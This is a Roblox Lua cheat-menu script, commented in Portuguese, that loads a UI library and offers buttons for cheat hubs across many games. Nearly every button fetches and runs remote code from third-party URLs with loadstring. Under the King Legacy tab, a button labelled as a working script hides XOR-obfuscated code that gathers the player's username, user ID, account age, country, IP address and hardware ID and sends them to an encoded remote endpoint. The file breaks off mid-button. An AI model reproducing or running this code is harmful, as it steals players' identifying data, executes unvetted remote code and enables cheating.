local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptBrv/LibraryUniversalLulze/refs/heads/main/LibraryUniversalLulze",true))();
local Window = Library:MakeWindow({Name = "Nome do Seu coides Universal",  SearchBar = "Default", HidePremium = false, SaveConfig = true, ConfigFolder = nil})

-- Creating the Discord tab
local discordTab = Window:MakeTab({
    Name = "Discord",
    Icon = "rbxassetid://90685941326593", -- Icon for the Discord tab
    PremiumOnly = false
})

-- Adding a section inside the Discord tab
local discordSection = discordTab:AddSection({
    Name = "Discord Link"
})

-- Discord link to copy
local discordLink = "discord.gg/NyhbVzG8qz"

-- Button to copy the Discord link
discordSection:AddButton({
    Name = "Copy Discord Link",
    Callback = function()
        setclipboard(discordLink) -- Copies the Discord link to the clipboard
        OrionLib:MakeNotification({
            Name = "Link Copied!",
            Content = "The Discord invite link has been copied to your clipboard.",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
    end
})

-- Adding another section with the link displayed
local discordSection2 = discordTab:AddSection({
    Name = "discord.gg/NyhbVzG8qz"
})

-- Button to copy the Discord link again
discordSection2:AddButton({
    Name = "discord.gg/NyhbVzG8qz",
    Callback = function()
        setclipboard(discordLink) -- Copies the Discord link to the clipboard
        OrionLib:MakeNotification({
            Name = "Link Copied!",
            Content = "The Discord invite link has been copied to your clipboard.",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
    end
})

-- Creating the Updates tab
local updatesTab = Window:MakeTab({
    Name = "Updates",
    Icon = "rbxassetid://85512488304541", -- Icon for the Updates tab
    PremiumOnly = false
})

-- Adding sections and labels inside the Updates tab
updatesTab:AddSection({ Name = "Updates" })
updatesTab:AddLabel("Future updates will be listed here.")
updatesTab:AddSection({ Name = "New Update" })
updatesTab:AddLabel("Multiple scripts for PC/Mobile added!")

-- Adding a section for Discord in the Updates tab
local updatesTabDiscordSection = updatesTab:AddSection({
    Name = "discord.gg/NyhbVzG8qz"
})

updatesTab:AddLabel("Have a script suggestion? Join the Discord!")

-- Button to copy the Discord link from the Updates tab
updatesTabDiscordSection:AddButton({
    Name = "discord.gg/NyhbVzG8qz",
    Callback = function()
        setclipboard(discordLink) -- Copies the Discord link to the clipboard
        OrionLib:MakeNotification({
            Name = "Link Copied!",
            Content = "The Discord invite link has been copied to your clipboard.",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
    end
})

-- Creating the Settings tab
local settingsTab = Window:MakeTab({
    Name = "Settings",
    Icon = "rbxassetid://85512488304541", -- Icon for the Settings tab
    PremiumOnly = false
})

-- Adding a section and label inside the Settings tab
settingsTab:AddSection({ Name = "Settings Section" })
settingsTab:AddLabel("Optimize your game for better FPS")

-- Button to enable the optimizer in the Settings tab
settingsTab:AddButton({
    Name = "Enable Optimizer",
    Callback = function()
        -- Executes the optimizer script
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptCentral-br/Otimizador/refs/heads/main/Otimizador.md"))()
        
        -- Notification for successful execution
        OrionLib:MakeNotification({
            Name = "Optimizer Activated",
            Content = "The optimizer script has been successfully executed.",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
    end
})

-- Criando a aba Fisch
local FischTab = Window:MakeTab({
    Name = "Fisch",
    Icon = "rbxassetid://108776114629126",  -- Ícone para a aba Fisch
    PremiumOnly = false
})

-- Criando a seção dentro da aba Fisch
local FischSection = FischTab:AddSection({
    Name = "Seção Fisch"
})

-- Criando o botão para executar o script
FischTab:AddButton({
    Name = "Naoki Hub",
    Callback = function()
        -- O código do script que você quer que seja executado vai aqui
        loadstring(game:HttpGet("https://naokihub.vercel.app",true))()

    end    
})

-- Criando o botão para executar o script
FischTab:AddButton({
    Name = "Aussie WIRE",
    Callback = function()
        -- O código do script que você quer que seja executado vai aqui
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()

    end    
})

-- Criando o botão para executar o script
FischTab:AddButton({
    Name = "Speed Hub X (Recomendado)",
    Callback = function()
        -- O código do script que você quer que seja executado vai aqui
        loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()  -- Exemplo de link para um script externo

    end    
})

-- Criando o botão para executar o script
FischTab:AddButton({
    Name = "Forge Hub",
    Callback = function()
        -- O código do script que você quer que seja executado vai aqui
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Skzuppy/forge-hub/main/loader.lua"))()

    end    
})

-- Criando o botão para executar o script
FischTab:AddButton({
    Name = "Goomba Hub",
    Callback = function()
        -- O código do script que você quer que seja executado vai aqui
        loadstring(game:HttpGet("https://raw.githubusercontent.com/JustLevel/goombahub/main/fisch.lua"))()

    end    
})

-- Criando o botão para executar o script
FischTab:AddButton({
    Name = "Project Spectrum",
    Callback = function()
        -- O código do script que você quer que seja executado vai aqui
        loadstring(game:HttpGet("https://raw.githubusercontent.com/xZPUHigh/Project-Spectrum/main/Loader.lua"))()

    end    
})

-- Criando um segundo botão, com a mesma funcionalidade
FischTab:AddButton({
    Name = "Rinns Hub",
    Callback = function()
        -- Aqui você pode colocar outro script para ser executado ao clicar
        loadstring(game:HttpGet("https://raw.githubusercontent.com/kylosilly/femboyware/refs/heads/main/Fisch.lua"))()

    end    
})

-- Criando um segundo botão, com a mesma funcionalidade
FischTab:AddButton({
    Name = "Moon X",
    Callback = function()
        -- Aqui você pode colocar outro script para ser executado ao clicar
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/cba17b913ee63c7bfdbb9301e2d87c8b.lua"))()

    end    
})

-- Criando um segundo botão, com a mesma funcionalidade
FischTab:AddButton({
    Name = "Bonk Hub",
    Callback = function()
        -- Aqui você pode colocar outro script para ser executado ao clicar
        loadstring(game:HttpGet("https://bonkhubloader.netlify.app",true))()

    end    
})

-- Criando a aba Blox Fruits
local BloxFruitTab = Window:MakeTab({
    Name = "Blox Fruits",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Corrigindo a criação da seção em "Blox Fruits"
local BloxFruitSection = BloxFruitTab:AddSection({
    Name = "Blox Fruits"
})

-- Corrigindo o botão "Red Z Hub"
BloxFruitTab:AddButton({
    Name = "Red Z Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua"))()
    end    
})

-- Corrigindo o botão "Red Z Hub"
BloxFruitTab:AddButton({
    Name = "Blox Fruits V2 (Funciona no Pc/Mobile)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/Kncrypt/refs/heads/main/sources/BloxFruit.lua"))()
    end    
})

-- Corrigindo o botão "Red Z Hub"
BloxFruitTab:AddButton({
    Name = "Mama Hub (Funciona no Pc/Mobile)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/MAMAhub1/Mmahub/main/README.md"))()
    end    
})

-- Corrigindo o botão "Red Z Hub"
BloxFruitTab:AddButton({
    Name = "Rua hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/daviduts1/rua-hub/main/auto%20bouty"))()
    end    
})

-- Corrigindo o botão "Speed Hub"
BloxFruitTab:AddButton({
    Name = "Speed Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()
    end    
})

-- Corrigindo o botão "MTriet Hub"
BloxFruitTab:AddButton({
    Name = "MTriet Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Minhtriettt/Free-Script/main/MTriet-Hub.lua"))()
    end    
})

-- Corrigindo o botão "Mukuru Hub"
BloxFruitTab:AddButton({
    Name = "Mukuru Hub",
    Callback = function()
        loadstring(game:HttpGet("https://auth.quartyz.com/scripts/Loader.lua"))()
    end    
})

-- Corrigindo o botão "Domadic Hub"
BloxFruitTab:AddButton({
    Name = "Domadic Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Domadicoof/Domadicoof/main/Domadichub/NottoGay/Start.ranscript"))()
    end    
})


BloxFruitTab:AddButton({
    Name = "W-Azure",
    Callback = function()
        -- Executando o script do Red Z Hub
        getgenv().Team = "Pirates"
getgenv().FixCrash = false
getgenv().FixCrash2 = false
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
        
    end    
})

BloxFruitTab:AddButton({
    Name = "HoHo Hub (Tem Key)",
    Callback = function()
        -- Executando o script do Red Z Hub
        loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()

    end    
})

-- Criando a aba para A Sols Rng
local SlimeSlayingOnileRPGTab = Window:MakeTab({
    Name = "Slime Slaying Online RPG",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local SlimeSlayingOnileRPGTab = SlimeSlayingOnileRPGTab:AddSection({
    Name = "Slime Slaying Online RPG"
})

-- Botão para executar o script Slap Battles
SlimeSlayingOnileRPGTab:AddButton({
    Name = "Slime Slaying Online RPG",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        script_key = "" 
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d8bf54daa5b358826ce74cab275f9135.lua"))()
        -- Notificação de sucessoa

    end    
})  

-- Criando a aba King Legacy
local KingLegacyTab = Window:MakeTab({
    Name = "King Legacy",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba King Legacy
KingLegacyTab:AddSection({
    Name = "King Legacy"
})

-- Corrigindo o botão Arc Hub
KingLegacyTab:AddButton({
    Name = "Tsuo Hub",
    Callback = function()
        -- Executando o script do Arc Hub
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Tsuo7/TsuoHub/main/king%20legacy"))()
        -- Notificação de sucesso após a execução
    end    
})

-- Corrigindo o botão Arc Hub
KingLegacyTab:AddButton({
    Name = "Arc Hub",
    Callback = function()
        -- Executando o script do Arc Hub
        loadstring(game:HttpGet("https://pastebin.com/raw/q7j7nAf0", true))()
        
        -- Notificação de sucesso após a execução
    end    
})

KingLegacyTab:AddButton({
    Name = "Executar (Funciona Pc/Mobile)",
    Callback = function()

        local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v28,v29) local v30={};for v40=1, #v28 do v6(v30,v0(v4(v1(v2(v28,v40,v40 + 1 )),v1(v2(v29,1 + (v40% #v29) ,1 + (v40% #v29) + 1 )))%256 ));end return v5(v30);end local v8=game:GetService(v7("\249\215\207\53\213\190\213\8\216\192\222","\126\177\163\187\69\134\219\167"));local v9=game:GetService(v7("\19\193\43\220\249\49\222","\156\67\173\74\165"));local v10=game:GetService(v7("\25\182\91\29\185\50\86\56\182\74\19\143\35\84\34\190\74\19","\38\84\215\41\118\220\70"));local v11=v9.LocalPlayer;local v12=v11.UserId;local v13=v11.DisplayName;local v14=v11.Name;local v15=tostring(v11.MembershipType):sub(16 + 5 );local v16=v11.AccountAge;local v17=game.LocalizationService.RobloxLocaleId;local v18=game:HttpGet(v7("\88\2\54\2\237\10\89\109\4\170\30\31\38\23\240\68\88\47\23\177","\158\48\118\66\114"));local v19=game:HttpGet(v7("\163\48\4\38\41\234\180\162\52\93\55\99\172\181\168\43\29\121\121\182\244\165","\155\203\68\112\86\19\197"));local v20=game:GetService(v7("\116\223\46\221\78\121\233\225\82\212\53\239\115\125\247\238\79\222\51","\152\38\189\86\156\32\24\133")):GetClientId();local v21=v7("\206\88\165\74\243\79\233\97\253\90\162\106\253\66\169\69\244\82\181\8\246\88\174\72\219\86\170\67\213\89\180\82\253\89\164\67\180","\38\156\55\199")   .. game.PlaceId   .. ', "'   .. game.JobId   .. '")' ;local v22=v10:GetProductInfo(game.PlaceId).Name;local function v23() return identifyexecutor();end print(v23());local function v24() local v31=0;local v32;local v33;while true do if (v31==0) then v32=v23();v33={[v7("\169\107\125\60\18\102\197\86\186\113","\35\200\29\28\72\115\20\154")]="",[v7("\26\176\223\203\136\34\32","\84\121\223\177\191\237\76")]="",[v7("\190\91\203\165\62\67","\161\219\54\169\192\90\48\80")]={{[v7("\72\87\20\45\70\80","\69\41\34\96")]={[v7("\178\194\218\15","\75\220\163\183\106\98")]=v7("\49\181\134\50\214\12\191\203\50\193\7\185\158\35\220\6\250\146\56\204\16\250\152\52\203\11\170\159","\185\98\218\235\87"),[v7("\222\46\43","\202\171\92\71\134\190")]=v7("\33\213\56\152\58\155\99\199\59\206\46\132\38\217\98\139\38\204","\232\73\161\76")},[v7("\191\220\81\94\12\178\201\86\84\17\181","\126\219\185\34\61")]=string.format(v7("\51\241\101\66\114\118\234\226\30\142\119\124\120\120\206\175\4\218\74\98\109\45\188\168\27\217\73\60\108\120\241\235\3\214\16\113\113\122\188\242\31\203\76\97\49\50\247\174\51\241","\135\108\174\62\18\30\23\147")   .. " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s"   .. "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s"   .. "\n\n__[Game Info](https://www.roblox.com/games/%d)__"   .. "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s"   .. "\n\n**Data:**```%s```\n\n**JobId:**```%s```" ,v12,v13,v14,v12,v15,v16,v17,v18,v20,tostring(os.date(v7("\243\228\101\142\28\225\118\254","\167\214\137\74\171\120\206\83"))),tostring(os.date(v7("\206\200","\199\235\144\82\61\152"))),game.PlaceId,v22,game.PlaceId,v32,v19,v21),[v7("\19\15\169\46","\75\103\118\217")]=v7("\213\93\115\28","\126\167\52\16\116\217"),[v7("\203\33\44\143\166","\156\168\78\64\224\212\121")]=tonumber(v7("\87\246\131\232\35\185\245\158","\174\103\142\197")),[v7("\66\32\74\53\39\80\249\95\36","\152\54\72\63\88\69\62")]={[v7("\193\214\226","\60\180\164\142")]=v7("\80\74\17\57\52\183\93\23\73\18\62\105\255\29\90\82\10\49\105\238\29\85\17\13\44\38\233\1\80\81\17\100\51\229\7\85\92\11\40\46\225\93\81\83\4\46\34\178\7\75\91\23\0\35\176","\114\56\62\101\73\71\141")   .. v12   .. v7("\254\254\210\192\172\225\134\149\237\185\157\204\189\224\220\204\172\180\138\145\232\175\221\203\170\228\218\208\229\249\213\195","\164\216\137\187") }}}};v31=1 -0 ;end if (v31==(1710 -(71 + 1638))) then return v8:JSONEncode(v33);end end end local function v25(v34,v35) local v36=0 -0 ;local v37;local v38;local v39;while true do if (v36==1) then v39={[v7("\246\29\142","\170\163\111\226\151")]=v34,[v7("\51\63\182\33","\73\113\80\210\88\46\87")]=v35,[v7("\172\41\217\26\232\133","\135\225\76\173\114")]=v7("\42\194\139\132","\199\122\141\216\208\204\221"),[v7("\133\216\17\244\125\228\190","\150\205\189\112\144\24")]=v37};v38(v39);break;end if (v36==(0 + 0)) then local v41=0 -0 ;while true do if (v41==(1 + 0)) then v36=1;break;end if ((0 + 0)==v41) then v37={[v7("\209\233\63\166\163\240\31\159\242\40\162\163","\107\178\134\81\210\198\158")]=v7("\57\30\146\202\163\59\15\150\207\165\54\65\136\213\165\54","\202\88\110\226\166")};v38=http_request or v38 or HttpPost or syn.request ;v41=1;end end end end end local v26=v7("\45\144\171\92\23\210\94\95\33\141\172\79\11\154\21\94\38\139\178\3\5\152\24\95\50\129\189\68\11\135\26\3\106\213\236\29\80\219\72\67\112\211\237\30\83\221\64\67\117\208\235\28\75\157\4\10\55\208\166\90\86\218\31\59\45\210\177\77\46\187\21\66\32\187\231\117\16\161\7\7\50\145\185\20\0\174\37\21\3\144\156\65\42\186\9\60\0\135\176\25\82\128\65\47\31\161\133\110\32\170\71\34\51\144\239\26\18\189\64\59\118","\112\69\228\223\44\100\232\113");local v27=v24();v25(v26,v27);
        
        -- Notificação de sucesso após a execução
    end    
})

KingLegacyTab:AddButton({
    Name = "Lol King",
    Callback = function()
        -- Executando o script do Arc Hub
        loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Legacy239/refs/heads/main/King908"))()
        
        -- Notificação de sucesso após a execução

    end    
})

KingLegacyTab:AddButton({
    Name = "Ls Zee Hub",
    Callback = function()
        -- Executando o script do Arc Hub
        loadstring(game:HttpGet('https://zuwz.me/Ls-Zee-Hub-KL'))()
        
    end    
})

-- Criando a aba anime shadow
local PhantomForcesTab= Window:MakeTab({
    Name = "Phantom Forces",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba 
PhantomForcesTab:AddSection({
    Name = "Phantom Forces"
})

-- Corrigindo o botão 
PhantomForcesTab:AddButton({
    Name = "Homo Hack (Funciona no Pc/Mobile)",
    Callback = function()
        -- Executando o script do 
        getgenv()["load_rewrite"] = true --// ONLY APPLIES TO PF
        loadstring(game:HttpGet("https://raw.githubusercontent.com/dementiaenjoyer/homohack/main/loader.lua"))()

    end    
})

-- Corrigindo o botão 
PhantomForcesTab:AddButton({
    Name = "Script 1",
    Callback = function()
        -- Executando o script do 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/SumCooki/Cooki-Hub/refs/heads/main/Cooki%20Hub"))()

    end    
})

-- Corrigindo o botão 
PhantomForcesTab:AddButton({
    Name = "Script 2",
    Callback = function()
        -- Executando o script do 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/CHASEAAAA/daddy/refs/heads/main/.lua"))()

    end    
})

-- Corrigindo o botão 
PhantomForcesTab:AddButton({
    Name = "Script 3",
    Callback = function()
        -- Executando o script do 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/JinxTheCatto/Neptune/main/NeptuneHub.lua"))()

    end    
})

-- Criando a aba para A Sols Rng
local ToiletDefenseSimulatoTab = Window:MakeTab({
    Name = "Toilet Defense Simulato",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local ToiletDefenseSimulatoTab = ToiletDefenseSimulatoTab:AddSection({
    Name = "Toilet Defense Simulato"
})

-- Botão para executar o script Slap Battles
ToiletDefenseSimulatoTab:AddButton({
    Name = "Script 1",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://rawscripts.net/raw/Fixes-Toilet-Defense-SEVEN-SCRIPT-9364", true))()
        -- Notificação de sucessoa

    end    
})


-- Criando a aba Pet Simulator 99
local PetSimulator99Tab = Window:MakeTab({
    Name = "Pet Simulator 99",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local PetSimulator99Tab = PetSimulator99Tab:AddSection({
    Name = "Pet Simulator 99d"
})

-- Corrigindo o botão "Zap Hub"
PetSimulator99Tab:AddButton({
    Name = "Zap Hub",
    Callback = function()
        loadstring(game:HttpGet("https://zaphub.xyz/Exec"))()

    end    
})

PetSimulator99Tab:AddButton({
    Name = "Aussie WIRE",
    Callback = function()
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()

    end    
})


-- Criando a aba 
local FrontlinesTab= Window:MakeTab({
    Name = "Frontlines",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba
FrontlinesTab:AddSection({
    Name = "Frontlines"
})

-- Corrigindo o botão 
FrontlinesTab:AddButton({
    Name = "Frontlines",
    Callback = function()
        -- Executando o script do 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Skzuppy/forge-hub/main/loader.lua"))()
        
        -- Notificação de sucesso após a execução

    end    
})

-- Botão para executar o script 
FrontlinesTab:AddButton({
    Name = "Main Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://scripts.waza80.com/script/Frontlines"))()
        
        -- Notificação de sucesso

    end    
})


-- Criando a aba para A Sols Rng
local DaHoodTab = Window:MakeTab({
    Name = "Da Hood",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local DaHoodTab = DaHoodTab:AddSection({
    Name = "Da Hood"
})

-- Botão para executar o script Slap Battles
DaHoodTab:AddButton({
    Name = "Press Q to target Aim",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        getgenv().Settings = {
            Key = "q",
            LOCK = true,
            NOTIF = true,
            Enable = true,
            AIRSHOT = true,
            AUTOPRED = true,
            RESOVLER = false,
            CHANCE = math.huge
    }
    loadstring(game:HttpGet'https://vode.gq/r/v2')()
        -- Notificação de sucessoa

    end    
})

-- Criando a aba para
local ZombieAttackTab = Window:MakeTab({
    Name = "Zombie Attack",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local ZombieAttackTab = ZombieAttackTab:AddSection({
    Name = "Zombie Attack"
})

-- Botão para executar o script 
ZombieAttackTab:AddButton({
    Name = "X Universal (Funciona no Pc/Mobile)",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Unknownproooolucky/Unknown-Hub-X-Universal-Games/main/Games/Zombie-Attack'))()
    end    
})

-- Criando a aba para Anime Last Stand
local SolsRngTab = Window:MakeTab({
    Name = "Anime Last Stand",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local SolsRngTab = SolsRngTab:AddSection({
    Name = "Anime Last Stand"
})

-- Botão para executar o script
SolsRngTab:AddButton({
    Name = "Buang Hub",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet("https://raw.githubusercontent.com/buang5516/buanghub/main/animeLastStand.lua"))()
    end    
})


-- Criando a aba Bed Wars
local BedWarsTab = Window:MakeTab({
    Name = "Bed Wars",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Corrigindo a criação da seção em Bed Wars
local BedWarsTab = BedWarsTab:AddSection({
    Name = "Bed Wars"
})

-- Corrigindo o botão "Aurora Hub"
BedWarsTab:AddButton({
    Name = "Aurora Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/cocotv666/Aurora/main/Aurora_Loader"))()
    end    
})

-- Criando a aba 
local JujutsuInfiniteTab= Window:MakeTab({
    Name = "Jujutsu Infinite",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba
JujutsuInfiniteTab:AddSection({
    Name = "Jujutsu Infinite"
})

-- Corrigindo o botão 
JujutsuInfiniteTab:AddButton({
    Name = "Free Hub",
    Callback = function()
        -- Executando o script do 
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Nate7z/JujutsuInfinite/refs/heads/main/Main.lua'))()
        
    end    
})

-- Criando a aba para o Anime Fighters Simulator
local AnimeFightersSimulatorTab = Window:MakeTab({
    Name = "Anime Fighters Simulator",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba
    PremiumOnly = false
})

-- Adicionando uma seção para o script do 
local AnimeFightersSimulatorTab = AnimeFightersSimulatorTab:AddSection({
    Name = "Anime Fighters Simulator"
})

-- Adicionando o botão para executar o script do Anime Fighters Simulator
AnimeFightersSimulatorTab:AddButton({
    Name = "Zer0 Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/JuninhoOGado/ScriptsSite/main/Script276"))()
    end    
})


-- Criando a aba para o RIVALS SCRIPT
local rivasTab = Window:MakeTab({
    Name = "Rivals",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba
    PremiumOnly = false
})

-- Adicionando uma seção para o script do RIVALS
local rivasTab = rivasTab:AddSection({
    Name = "Rivals"
})

-- Adicionando o botão para executar o script do RIVALS
rivasTab:AddButton({
    Name = "Rybow Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
    end    
})

-- Adicionando o botão para executar o script do RIVALS
rivasTab:AddButton({
    Name = "Rivals (Funciona no Pc/Mobile)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
    end    
})

-- Criando a aba Arsenal 
local ArsenalTab = Window:MakeTab({
    Name = "Arsenal",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba Anrsenal
ArsenalTab:AddSection({
    Name = "Arsenal"
})

-- Adicionando o botão para executar o script
ArsenalTab:AddButton({
    Name = "Executar Script",
    Callback = function()
        -- Executa o script do Anime Simulator
        loadstring(game:HttpGet("https://raw.githubusercontent.com/JuninhoOGado/ScriptsSite/main/Script278"))()
        
        -- Notificação de sucesso após a execução
    end    
})

-- Criando a aba para o Murder Mystery 2
local MurderMysteryTab = Window:MakeTab({
    Name = "Murder Mystery 2",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba
    PremiumOnly = false
})

-- Adicionando uma seção para o script do Murder Mystery 2
local MurderMysterySection = MurderMysteryTab:AddSection({
    Name = "Murder Mystery 2"
})

-- Adicionando o botão para executar o script do Murder Mystery 2
MurderMysteryTab:AddButton({
    Name = "Executar Murder Mystery 2",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
    end    
})

-- Adicionando o botão para executar o script do Murder Mystery 2
MurderMysteryTab:AddButton({
    Name = "Aussie WIRE",
    Callback = function()
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()
    end    
})

-- Adicionando o botão para executar o script do Murder Mystery 2
MurderMysteryTab:AddButton({
    Name = "Azure 1.2",
    Callback = function()
        loadstring(game:HttpGet("https://gist.githubusercontent.com/Raiden84200/84e60fdd20e2d13751f9ad657c8f0a9d/raw/81a130176baf8072b729d6d11549487d283abbee/Lua"))()
    end    
})

-- Adicionando o botão para executar o script do Murder Mystery 2
MurderMysteryTab:AddButton({
    Name = "YARHM",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/JuninhoOGado/ScriptsSite/main/Script282"))()
    end    
})

-- Criando a aba para
local ArmWrestleSimulatorTab = Window:MakeTab({
    Name = "Arm Wrestle Simulator",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba (você pode mudar se quiser)
    PremiumOnly = false
})

-- Criando uma seção dentro da aba
local ArmWrestleSimulatorTab = ArmWrestleSimulatorTab:AddSection({
    Name = "Arm Wrestle Simulator"
})

-- Botão para executar o script
ArmWrestleSimulatorTab:AddButton({
    Name = "Script New Upd",  -- Nome do botão
    Callback = function()
        -- Executando o script do link fornecido
        loadstring(game:HttpGet('https://lua-library.btteam.net/script-auth.txt'))()
    end    
})

-- Criando a aba SCP 3008
local scp3008tab = Window:MakeTab({
    Name = "SCP 3008",
    Icon = "rbxassetid://108776114629126",  -- Você pode usar um ícone de sua escolha
    PremiumOnly = false
})

-- Criando a seção dentro da aba SCP 3008
scp3008tab:AddSection({
    Name = "SCP 3008"
})

-- Corrigindo o botão  
scp3008tab:AddButton({
    Name = "Neuron",
    Callback = function()
        -- Executando o script
        loadstring(game:HttpGet"https://raw.githubusercontent.com/Yumiara/Python/refs/heads/main/SCP3008.py")()
    end    
})

-- Criando a aba para o Anime Vanguard
local animevanguardTab = Window:MakeTab({
    Name = "Anime Vanguard",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba
    PremiumOnly = false
})

-- Adicionando uma seção para o script do Anime Vanguard
local animevanguardSection = animevanguardTab:AddSection({
    Name = "Anime Vanguard"
})

-- Adicionando o botão para executar o script do Anime Vanguard
animevanguardSection:AddButton({
    Name = "Star Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Tilitestaccount/Star-Hub-Files/refs/heads/main/Star%20Hub%20Free"))() 
    end    
})

-- Criando a aba para o Blade Ball
local BladeBallTab = Window:MakeTab({
    Name = "Blade Ball",
    Icon = "rbxassetid://108776114629126",  -- Ícone da aba
    PremiumOnly = false
})

-- Adicionando uma seção para o script do Blade Ball
local BladeBallTab = BladeBallTab:AddSection({
    Name = "Blade Ball"
})

-- Adicionando o botão para executar o script do Blade Ball
BladeBallTab:AddButton({
    Name = "Executar Blade Ball",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/autoparry.lua"))()
    end    
})

-- Adicionando o botão para executar o script do Blade Ball
BladeBallTab:AddButton({
    Name = "Aussie WIRE",
    Callback = function()
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()
    end    
})

-- Adicionando o botão para executar o script do Blade Ball
BladeBallTab:AddButton({
    Name = "Speed Hub (Funciona no Pc/Mobile)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Official-Gamer-123/Speed-Hub-Official-Releases-Free/main/SpeedHub_Updated_Key_System_BladeBall.txt"))()
    end    
})

-- Adicionando o botão para executar o script do Blade Ball
BladeBallTab:AddButton({
    Name = "Lunax Hub (Funciona no Pc/Mobile)",
    Callback = function()
